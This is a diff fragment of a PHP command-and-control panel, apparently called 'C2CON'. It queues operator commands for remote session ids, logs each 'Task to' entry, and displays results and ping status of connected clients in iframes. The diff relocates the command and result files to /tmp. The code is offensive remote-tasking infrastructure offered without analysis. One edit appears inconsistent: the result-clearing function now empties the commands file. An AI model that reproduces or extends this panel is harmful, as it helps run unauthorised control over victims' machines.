@@ -129,12 +129,12 @@ $cmd=$_REQUEST[ 'cmd' ];
 $cmd=urldecode($cmd);
 if (!empty($cmd)) {
 
-$file = '../cmds.txt';
+$file = '/tmp/C2CON-cmds.txt';
 $current = file_get_contents($file);
 $current .= $sid.":".$cmd.PHP_EOL;
 file_put_contents($file, $current);
 
-$file = '../res.txt';
+$file = '/tmp/C2CON-res.txt';
 $current = file_get_contents($file);
 $current .= "Task to ".$sid." => ".$cmd.PHP_EOL;
 file_put_contents($file, $current);
@@ -147,7 +147,7 @@ file_put_contents($file, $current);
 
 <?php
  function del_res(){
-file_put_contents('../res.txt', '');
+file_put_contents('/tmp/C2CON-cmds.txt', '');
 }
 
 
@@ -193,7 +193,7 @@ function reloadfrm() {
 </div>
 
 <div>
-<iframe src='../res.txt' height=400 width=800 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='../ping.txt' height=400 width=800 id="iframeping" style="border:0;background-color: Black;"></iframe>
+<iframe src='readres.php' height=400 width=800 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='readping.php' height=400 width=800 id="iframeping" style="border:0;background-color: Black;"></iframe>
 
 </div>
 
